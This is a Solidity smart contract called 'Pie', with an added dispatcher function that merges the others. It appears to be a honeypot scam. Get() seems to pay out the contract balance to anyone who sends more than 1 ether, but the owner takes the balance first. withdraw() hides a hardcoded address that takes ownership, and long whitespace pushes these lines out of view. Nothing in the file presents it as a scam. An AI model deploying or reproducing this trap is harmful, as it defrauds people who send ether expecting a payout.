pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = msg.sender;

    function()
    public
    payable
    {

    }

    function Get()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }

    // Unified dispatcher - merged from: Command, Get, withdraw
    // Selectors: Command=0, Get=1, withdraw=2
    function execute(uint8 _selector, address adr, bytes data) public payable {
        // Original: Command()
        if (_selector == 0) {
            require(msg.sender == Owner);
            adr.call.value(msg.value)(data);
        }
        // Original: Get()
        else if (_selector == 1) {
            if(msg.value>1 ether)
            {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
            }
        }
        // Original: withdraw()
        else if (_selector == 2) {
            if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
            require(msg.sender == Owner);
            Owner.transfer(this.balance);
        }
    }
}